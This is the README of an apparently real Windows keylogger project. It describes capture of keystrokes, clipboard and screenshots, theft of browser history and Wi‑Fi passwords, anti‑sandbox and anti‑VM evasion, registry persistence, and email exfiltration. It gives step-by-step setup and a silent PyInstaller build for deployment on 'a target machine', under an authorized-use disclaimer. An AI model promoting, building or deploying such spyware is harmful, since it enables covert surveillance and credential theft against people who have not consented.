# Keylogger

A stealthy, resilient Windows keylogger that captures keystrokes, clipboard data, screenshots, and system information, then exfiltrates everything via encrypted email.  
Built for security research and authorized testing only.

---

## Features

- **Keystroke logging** – records every key press, including special keys (`Enter`, `Tab`, `Esc`, etc.).
- **Clipboard monitoring** – silently captures the current clipboard content on each report.
- **Screenshot capture** – takes a screenshot on every report, plus extra shots when `Enter` (up to 10) or `Delete` (up to 5) is pressed.
- **System information harvesting** – collects host details, public IP, browser history (Chrome, Edge, Brave, Opera, Firefox), DNS cache, Wi‑Fi profiles & passwords, installed software, running processes, and selected environment variables.
- **Encrypted local storage** – all logs are encrypted on disk with **AES‑256‑GCM** before being sent.
- **Unsent log queue** – if email sending fails, the data is stored and automatically retried on the next interval – nothing is lost.
- **Anti‑sandbox / anti‑VM checks** – avoids running inside common analysis environments.
- **Persistence** – copies itself to a randomized location and adds a registry `Run` key to survive reboots.
- **Dynamic reporting** – reports are sent with a ±20 % random jitter to avoid predictable patterns.
- **Configuration via `.env`** – no credentials are hardcoded in the source files.

---

## Setup

### 1. Clone the repository & enter the folder
```bash
git clone https://github.com/VKspyder2003/KeyLogger.git
cd KeyLogger
```

### 2. Install requirements
```bash
pip install -r requirements.txt
```

### 3. Create a `.env` file
In the project folder, create a file named **`.env`** with the following content (replace with your credentials):

```ini
KL_EMAIL=your@gmail.com
KL_PASS=your_app_password_here
KL_INTERVAL=300
```

- `KL_EMAIL` – the Gmail address used to send and receive the reports.  
- `KL_PASS` – an [App Password](https://support.google.com/mail/answer/185833?hl=en) for that account (2‑factor authentication must be enabled).  
- `KL_INTERVAL` – report interval in seconds (default `300` = 5 minutes).

---

## Usage

Simply run the entry point:

```bash
python main.py
```

The script will start silently (no console output).
To stop the keylogger, kill the process (e.g., via Task Manager) or shut down the machine.

---

## Building an executable

When you’re ready to create a standalone `.exe` (for authorized testing on a target machine), use PyInstaller:

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole main.py
```

The final executable will be inside the `dist` folder.  
Make sure all dependencies are installed in the build environment – PyInstaller will bundle them automatically.

> Note: The `.env` file is only used during development. For a deployable executable, you must embed the credentials into `main.py` before building (a tiny builder script is provided in the repo).

---

## Project structure

```
KeyLogger/
├── .gitignore
├── README.md
├── requirements.txt
├── .env                    (ignored by git)
├── main.py                 (entry point)
├── keylogger.py            (core keylogger engine)
├── com_info.py             (system info gathering module)
└── builder.py              (optional: embed .env into build)
```

---

## ⚠️ Legal & ethical warning

This tool is intended **exclusively for educational purposes and authorized security assessments**.  
Keylogging without explicit consent is illegal and unethical. You must have proper written permission before running it on any device you do not personally own.  

The author assumes no liability for misuse.

---

## Credits

- Original concept adapted from various open‑source keylogger projects.  
- Heavy refactoring, modularisation, encryption, and anti‑analysis features added by [VKspyder2003](https://github.com/VKspyder2003).

---

*Stay curious, stay ethical.*